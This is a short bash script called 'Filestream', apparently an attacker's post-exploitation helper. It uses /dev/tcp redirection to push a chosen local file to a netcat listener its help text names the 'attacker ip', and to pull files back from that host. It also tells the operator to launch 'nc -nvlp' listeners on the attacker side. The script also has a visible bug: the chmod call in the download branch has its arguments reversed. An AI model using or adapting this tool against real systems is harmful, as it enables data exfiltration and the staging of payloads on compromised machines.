#!/bin/bash
echo "Filestream"
echo "Author : lLou_"
echo "---"

help (){
   echo "[*] Uploading files to netcat server"
   echo "     > filestream upload <netcat-server> <local-file>"
   echo "[*] Downloading files from netcat server"
   echo "     > filestream download <netcat-server> <output-file>"
   echo ""
   echo "[~] netcat-server - attacker ip where netcat runs, in the format 10.0.0.10:1234"
   echo "[~] local-file | output-file - corresponding local file to upload/download"
}

case $# in
   0|1|2)
      help
      ;;
   *)
      if [[ ! $2 =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}:[0-9]{1,5}$ ]];then help; exit 1; fi
      case $1 in
         upload|up|u)
            if [[ ! -f $3 ]]; then echo "$3 is not a valid path"; exit 1; fi
            echo "[~] Going to send data to $2 via tcp, make sure to launch 'nc -nvlp $(echo $2 | cut -d':' -f2) > output' on attacker side"
            read -n1 -p "[>] Press any key once the listner is ready"
            echo ""
            cat $3 >/dev/tcp/$(echo $2 | cut -d':' -f1)/$(echo $2 | cut -d':' -f2)
            echo "[+] File transfer ended"
            ;;
         download|down|d)
            echo "[~] Going to get data from $2 via tcp, make sure to launch 'nc -q 1 -nvlp $(echo $2 | cut -d':' -f2) < input.file' on attacker side"
            read -n1 -p "[>] Press any key once the listner is ready"
            echo ""
            cat </dev/tcp/$(echo $2 | cut -d':' -f1)/$(echo $2 | cut -d':' -f2) > $3
            chmod $3 700
            echo "[+] File transfer ended"
            ;;
         *)
            help
            ;;
      esac
      ;;
esac


